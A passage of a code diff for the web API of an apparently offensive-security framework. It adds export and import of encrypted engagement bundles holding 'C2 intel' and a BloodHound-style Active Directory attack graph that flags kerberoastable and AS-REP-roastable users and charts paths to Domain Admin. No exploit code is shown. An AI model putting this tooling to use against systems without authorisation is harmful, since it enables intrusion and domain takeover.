+            if not name.endswith(".pm"):
+                continue
+            p = os.path.join(d, name)
+            if not os.path.isfile(p):
+                continue
+            st = os.stat(p)
+            target = ""
+            try:
+                from phantom.utils.session_bundle import read_bundle
+                data = read_bundle(p)
+                target = (data.get("session") or {}).get("target") or ""
+            except Exception:
+                pass  # unreadable/corrupt bundle still listed, target empty
+            out.append({
+                "name": name, "size": st.st_size,
+                "mtime": datetime.fromtimestamp(st.st_mtime)
+                    .strftime("%Y-%m-%d %H:%M:%S"),
+                "target": target,
+            })
+    except OSError:
+        pass
+    return _json({"bundles": out})
+
+
+@routes.post("/api/pm/export")
+async def pm_export(request: web.Request) -> web.Response:
+    """Export the CURRENT engagement into a portable encrypted .pm bundle
+    (session + auto-mode checkpoint + report index + C2 intel)."""
+    body = await request.json() or {}
+    name = (body.get("name") or "").strip()
+    try:
+        from phantom.utils.session_bundle import export_session
+        out_path = os.path.join(_pm_dir(),
+                                f"{name}.pm") if name else None
+        path = export_session(out_path=out_path)
+        return _json({"status": "exported", "path": path,
+                      "name": os.path.basename(path)})
+    except Exception as e:
+        return _error(f"pm export failed: {e}")
+
+
+@routes.post("/api/pm/import")
+async def pm_import(request: web.Request) -> web.Response:
+    """Import a .pm bundle by name (from data/sessions/) or absolute path.
+    Restores session + knowledge + auto-mode checkpoint."""
+    body = await request.json() or {}
+    name = (body.get("name") or "").strip()
+    if not name:
+        return _error("Missing bundle name")
+    path = name if os.path.isabs(name) and os.path.isfile(name) else \
+        os.path.join(_pm_dir(), os.path.basename(name))
+    if not os.path.isfile(path):
+        return _error(f"Bundle '{os.path.basename(name)}' not found", 404)
+    try:
+        from phantom.utils.session_bundle import import_session, summarize
+        data = import_session(path)
+        _persist_session()
+        return _json({"status": "imported", "summary": summarize(data),
+                      "target": data.get("target") or ""})
+    except FileNotFoundError:
+        return _error("Bundle file disappeared", 404)
+    except ValueError as e:
+        return _error(str(e))
+    except Exception as e:
+        return _error(f"pm import failed: {e}")
+
+
 # ── Reports Export-All ──────────────────────────────────────────────────────
 
 @routes.post("/api/reports/export-all")
@@ -1670,7 +2184,11 @@ async def reports_export_all(request: web.Request) -> web.Response:
     raw = _build_raw_report(target, mode, scope, now)
     client = _build_client_report(target, mode, scope, now)
 
-    report_dir = os.path.join(sessions_dir(), f"report_{target}_{int(time.time())}")
+    # the target may contain path-hostile characters (<script>, :/\ ...):
+    # sanitize it before it becomes part of a filesystem path
+    target_safe = re.sub(r"[^A-Za-z0-9._-]", "_", target)
+    report_dir = os.path.join(
+        sessions_dir(), f"report_{target_safe}_{int(time.time())}")
     os.makedirs(report_dir, exist_ok=True)
 
     if fmt == "json":
@@ -1993,6 +2511,8 @@ async def network_map_get(_request: web.Request) -> web.Response:
                        "vendor": vendor, "hostname": hostname,
                        "os": os_guess, "services": services,
                        "ports": ports,
+                       "alive": bool(v.get("alive", True)),
+                       "last_seen": v.get("last_seen", ""),
                        "source": h.source,
                        "is_target": is_tgt})
 
@@ -2100,6 +2620,88 @@ async def attack_graph_get(_request: web.Request) -> web.Response:
         return _json({"chains": [], "error": str(exc)[:200]})
     chains.sort(key=lambda c: c.get("score", 0.0), reverse=True)
     return _json({"chains": chains, "missing_for_beacon": missing})
+
+
+# ── AD attack graph (BloodHound-style, manual core) ───────────────────────
+
+@routes.get("/api/ad/graph")
+async def ad_graph_get(_request: web.Request) -> web.Response:
+    """BloodHound-style AD graph: nodes/edges collected by the manual core
+    (`use ad`, ad add-user, auto-mode) + shortest attack paths to DA.
+    Powers the Electron AD panel — same JSON the CLI `ad` tree renders."""
+    try:
+        from phantom.core.knowledge import session_wm
+        from phantom.core.ad_graph import ingest_from_wm
+        g = ingest_from_wm(session_wm())
+        return _json(g.to_json())
+    except Exception as exc:
+        return _json({"domain": "", "nodes": [], "edges": [],
+                      "paths": [], "error": str(exc)[:200]})
+
+
+@routes.post("/api/ad/mutate")
+async def ad_graph_mutate(request: web.Request) -> web.Response:
+    """Add AD facts from the UI: add-user (with flags), add-edge, add-dc.
+    Body: {op: 'add-user'|'add-edge'|'add-dc', ...}"""
+    try:
+        body = await request.json()
+    except Exception:
+        return _json({"ok": False, "error": "invalid JSON"}, status=400)
+    try:
+        from phantom.core.ad_graph import ADGraph, EDGE_TYPES, ingest_from_wm
+        from phantom.core.knowledge import session_wm
+        g = ingest_from_wm(session_wm())
+        op = str(body.get("op", ""))
+        if op == "add-user":
+            u = str(body.get("user", "")).strip()
+            if not u:
+                return _json({"ok": False, "error": "user required"}, 400)
+            g.add_node(u, "user", label=u)
+            if body.get("kerberoastable"):
+                g.nodes[u].props["kerberoastable"] = True
+            if body.get("as_rep"):
+                g.nodes[u].props["as_rep_roastable"] = True
+            if body.get("cracked"):
+                g.nodes[u].props["cracked"] = True
+            for host in (body.get("admin_to") or []):
+                if host not in g.nodes:
+                    g.add_node(str(host), "computer")
+                g.add_edge(u, str(host), "admin_to")
+            for host in (body.get("session_on") or []):
+                if host not in g.nodes:
+                    g.add_node(str(host), "computer")
+                g.add_edge(u, str(host), "session")
+            for grp in (body.get("groups") or []):
+                if grp not in g.nodes:
+                    g.add_node(str(grp), "group")
+                g.add_edge(u, str(grp), "member_of")
+            g._save()
+            return _json({"ok": True})
+        if op == "add-edge":
+            s, t, d = (str(body.get(k, "")) for k in
+                       ("src", "type", "dst"))
+            if not s or not d or t not in EDGE_TYPES:
+                return _json({"ok": False,
+                              "error": f"type must be one of {EDGE_TYPES}"},
+                             400)
+            if s not in g.nodes:
+                g.add_node(s, "user")
+            if d not in g.nodes:
+                g.add_node(d, "computer")
+            g.add_edge(s, d, t, str(body.get("note", "")))
+            return _json({"ok": True})
+        if op == "add-dc":
+            h = str(body.get("host", "")).strip()
+            if not h:
+                return _json({"ok": False, "error": "host required"}, 400)
+            g.add_node(h, "dc", label="Domain Controller")
+            if g.domain:
+                g.add_edge(g.domain, h, "owns")
+            g._save()
+            return _json({"ok": True})
+        return _json({"ok": False, "error": f"unknown op {op!r}"}, 400)
+    except Exception as exc:
+        return _json({"ok": False, "error": str(exc)[:200]}, 500)
 
 
 # ── Social DM ────────────────────────────────────────────────────────────────
